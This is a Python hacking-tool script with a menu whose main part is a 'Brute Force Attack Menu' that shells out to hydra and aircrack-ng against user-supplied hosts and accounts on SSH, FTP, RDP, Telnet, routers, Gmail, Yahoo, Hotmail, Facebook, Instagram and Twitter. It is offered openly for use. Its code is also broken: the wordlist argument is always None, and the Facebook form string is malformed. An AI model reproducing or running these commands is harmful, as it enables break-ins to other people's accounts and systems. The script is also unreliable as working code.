import random
import string
import hashlib
import sys
import os
import time

password = " "
print("""
  █▀▄ █▀▀▄ █░█ ▀█▀ █▀▀ ▄▀▄ ▀█▀ ▀█▀ ▄▀▄ ▄▀ █░▄▀
 █▀█ █▐█▀ █░█ ░█░ █▀▀ █▀█ ░█░ ░█░ █▀█ █░ █▀▄░
 ▀▀░ ▀░▀▀ ░▀░ ░▀░ ▀▀▀ ▀░▀ ░▀░ ░▀░ ▀░▀ ░▀ ▀░▀▀ """)

def restart_program():
    python = sys.executable
    os.execl(python, python, *sys.argv)
    curdir = os.getcwd()

# Password cracker function
def password_cracker():
    print("""
+-----------------------------------+
|  Password & Pin Cracker    |                                      
+-----------------------------------+   """)
    
    repeat_value = int(input(" Guess the length of the password: "))
    characters = string.ascii_letters + string.digits + string.punctuation
    password_length = repeat_value

    for i in range(len(characters) ** password_length):
        passcode = ''.join(characters[(i // (len(characters) ** j)) % len(characters)] for j in range(password_length - 1, -1, -1))
        print(passcode, end='\n')
        time.sleep(0.1)

# Main menu
while True:
    print('''
Options:
1. Generate Password
2. Hash Password
3. Brute Force Attacks
4. Exit''')

    choice = input(" Enter your choice: ")

    if choice == "1":
        length = int(input(" Enter the length of the password: "))
        characters = string.ascii_letters + string.digits + string.punctuation
        password = ''.join(random.choice(characters) for _ in range(length))
        print(" Generated Password:", password)

    elif choice == "2":
        password = input(" Enter Password:")
        algorithm = input(" Choose hashing algorithm (MD5, SHA256, or SHA512): ")
        if algorithm.lower() == 'md5':
            hashed_password = hashlib.md5(password.encode()).hexdigest()
        elif algorithm.lower() == 'sha256':
            hashed_password = hashlib.sha256(password.encode()).hexdigest()
        elif algorithm.lower() == 'sha512':
            hashed_password = hashlib.sha512(password.encode()).hexdigest()
        else:
            print(" Invalid algorithm choice. Please choose MD5, SHA256, or SHA512.")

        print(f"{algorithm} Hash:", hashed_password)

    elif choice == "3":
        print("""
    +------------------------------------------+
    |      Brute Force Attack Menu       |
    +------------------------------------------+
    |  [01] Cisco Brute Force                |
    |  [02] VNC Brute Force                  |
    |  [03] FTP Brute Force                   |
    |  [04] Gmail Brute Force               |
    |  [05] SSH Brute Force                   |
    |  [06] TeamSpeak Brute Force       |
    |  [07] Telnet Brute Force               |
    |  [08] Yahoo Mail Brute Force       |
    |  [09] Hotmail Brute Force             |
    |  [10] Router Brute Force               |
    |  [11] RDP Brute Force                   |
    |  [12] MySQL Brute Force               |
    |  [13] Instagram Brute Force          |
    |  [14] Facebook Brute Force           |
    |  [15] Twitter Brute Force               |
    +--------------------------------------------+
    """)
        b = input(" [*] Enter option: ")

        # Add similar blocks for other brute force attacks...
        if b == '01' or b == '1':
        # Cisco Brute Force
             print("\n[!] Cisco Brute Force selected.")
             iphost = input("[*] IP/Hostname: ")
             word = password_cracker()
             os.system(f"hydra -P {word} {iphost} cisco")
             sys.exit()
        elif b == '02' or b == '2':
        # VNC Brute Force
             print("\n[!] VNC Brute Force selected.")
             word = password_cracker()
             iphost = input("[*] IP/Hostname: ")
             os.system(f"hydra -P {word} -e n -t 1 {iphost} vnc -V")
             sys.exit()

        elif b == '03' or b == '3':
        # FTP Brute Force
             print("\n[!] FTP Brute Force selected.")
             user = input("[*] User: ")
             iphost = input("[*] IP/Hostname: ")
             word = password_cracker()
             os.system(f"hydra -l {user} -P {word} {iphost} ftp")
             sys.exit()

        elif b == '04' or b== '4':
        # Gmail Brute Force
             print("\n[!] Gmail Brute Force selected.")
             email = input("[*] Email: ")
             word = password_cracker()
             os.system(f"hydra -l {email} -P {word} -s 465 smtp.gmail.com smtp")
             sys.exit()

        elif b == '05' or b== '5':
        # SSH Brute Force
             print("\n[!] SSH Brute Force selected.")
             user = input("[*] User: ")
             word = password_cracker()
             iphost = input("[*] IP/Hostname: ")
             os.system(f"hydra -l {user} -P {word} {iphost} ssh")
             sys.exit()

        elif b == '06' or b== '6':
        # TeamSpeak Brute Force
             print("\n[!] TeamSpeak Brute Force selected.")
             user = input("[*] User: ")
             word = password_cracker()
             iphost = input("[*] IP/Hostname: ")
             os.system(f"hydra -l {user} -P {word} -s 8676 {iphost} teamspeak")
             sys.exit()

        elif b == '07' or b== '7':
        # Telnet Brute Force
             print("\n[!] Telnet Brute Force selected.")
             user = input("[*] User: ")
             word = password_cracker()
             iphost = input("[*] IP/Hostname: ")
             os.system(f"hydra -l {user} -P {word} {iphost} telnet")
             sys.exit()

        elif b == '08' or b == '8':
        # Yahoo Brute Force
             print("\n[!] Yahoo Brute Force selected.")
             email = input("[*] Email: ")
             word = password_cracker()
             os.system(f"hydra -l {email} -P {word} -s 587 smtp.mail.yahoo.com smtp")
             sys.exit()

        elif b == '09' or b == '9':
        # Hotmail Brute Force
             print("\n[!] Hotmail Brute Force selected.")
             email = input("[*] Email: ")
             word = password_cracker()
             os.system(f"hydra -l {email} -P {word} -s 587 smtp.live.com smtp")
             sys.exit()

        elif b == '10':
        # Router Brute Force
             print("\n[!] Router Brute Force selected.")
             user = input("[*] User: ")
             os.system(f"airodump-ng wlan0mon")
             iphost = input("[*] IP/Hostname: ")
             word = password_cracker()
             os.system(f"aircrack-ng -w {word} wpa.cap")
             
             sys.exit()

        elif b == '11':
        # RDP Brute Force
             print("\n[!] RDP Brute Force selected.")
             user = input("[*] User: ")
             word = password_cracker()
             iphost = input("[*] IP/Mac address: ")
             os.system(f"hydra -t 1 -V -f -l {user} -P {word} {iphost} rdp")
             sys.exit()

        elif b == '12':
        # MySQL Brute Force
             print("\n[!] MySQL Brute Force selected.")
             user = input("[*] User: ")
             word = password_cracker()
             os.system(f"hydra -t 5 -V -f -l {user} -e ns -P {word} localhost mysql")
        elif b == '13':
        # Instagram Brute Force
             print("\n[!] Instagram  Brute Force selected.")
             user = input("[*] User: ")
             word = password_cracker()
             os.system(f"hydra -m / -l {user} -P {word} https://www.instagram.com/accounts/login/?hl=en http-get ")
        elif b == '14':
        # Facebook Brute Force
             print("\n[!] Facebook Brute Force selected.")
             user = input("[*] User: ")
             word = password_cracker()
             os.system(f"hydra -m / -l {user} -P {word} https://www.facebook.com/login/ http-post-form '/login.php:username=^USER&password=^PASS^:F=<form name ='login''")
        elif b == '15':
        # Twitter Brute Force
             print("\n[!] Twitter Brute Force selected.")
             user = input("[*] User: ")
             word = password_cracker()
             iphost = input("[*] IP/Hostname: ")
             os.system(f"hydra -m / -l {user} -P {word} https://twitter.com/i/flow/login http-get ")
       
             sys.exit()
        elif b == '00' or b == '0':
             print("\n[!] Exiting the Brute Force Attack Menu.")
       
        else:
             print(" \n[!] ERROR: Wrong Input ")
             time.sleep(1)
             restart_program()

    elif choice == "4":
        print(" Exiting Tool, Thanks for using ---[by Sourab Ghosh] ")
        break
    else:
        print(" Invalid choice. Please try again.")
